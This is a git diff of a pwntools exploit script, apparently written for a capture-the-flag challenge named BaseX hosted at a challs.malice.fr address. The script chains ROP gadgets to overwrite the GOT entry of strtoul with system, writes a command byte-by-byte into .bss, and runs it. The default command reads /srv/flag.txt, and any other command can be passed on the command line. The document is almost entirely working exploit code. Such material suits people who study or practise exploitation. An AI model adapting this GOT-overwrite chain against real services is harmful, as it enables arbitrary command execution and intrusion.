@@ -45,7 +45,7 @@ def int2base(x, base):
     return ''.join(digits)
 
 if DEBUG:
-    r = process('./BaseX')#, env={'LD_PRELOAD':'{0}/libc.so.6 {0}/ld-linux-x86-64.so.2'.format(os.getcwd())})
+    r = process('./BaseX')
 else:
     r = remote('basex.challs.malice.fr', 4444)
 
@@ -59,37 +59,32 @@ if GDB and DEBUG:
 # gadgets
 add = 0x00000000004005f8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 rbxrbp = 0x000000000040075f # pop rbx ; pop rbp ; ret
-rsp = 0x000000000040075b # add rsp, 0x38 ; pop rbx ; pop rbp ; ret
 rdi = 0x00000000004008f3 # pop rdi ; ret
-rsi = 0x00000000004008f1 # pop rsi ; pop r15 ; ret
 
 diff_system = libc.symbols['system'] - libc.symbols['strtoul']
 if diff_system < 0:
     diff_system = (1<<32) + diff_system
 
-# the ROP chain will add the difference between __stack_chk_fail and system by using gadgets
-# then we find in the stack our rdi which points to the string passed to system
-# we need a sane value for rbp before calling __stack_chk_fail
-cmd = 'cat entrypoint.sh'
+# the ropchain will add the difference between got.strtoul and system
+# then put the cmd inside the bss thanks to the add gadget
+# then call system
+cmd = 'cat /srv/flag.txt'
 if len(sys.argv) >= 3:
     cmd = sys.argv[2]
 idx = b.bss(0x50 + 0x3d)
-# first increase b.got['__stack_chk_fail'] to system
+
+# first, modify got.strtoul to system
 ROP = [rbxrbp,
     diff_system,
     b.got['strtoul'] + 0x3d,
     add]
+# then we add our command to the bss
 for i in xrange(0, len(cmd), 4):
     ROP.append(rbxrbp)
     ROP.append(int(cmd[i:i+4][::-1].encode('hex'),16))
     ROP.append(idx)
     ROP.append(add)
     idx += 4
-    # then we add our command to the bss
-    rbxrbp,
-    cmd,
-    b.bss(0x50 + 0x3d),
-    add,
 # then we call system
 ROP.extend([rdi,
     b.bss(0x50),
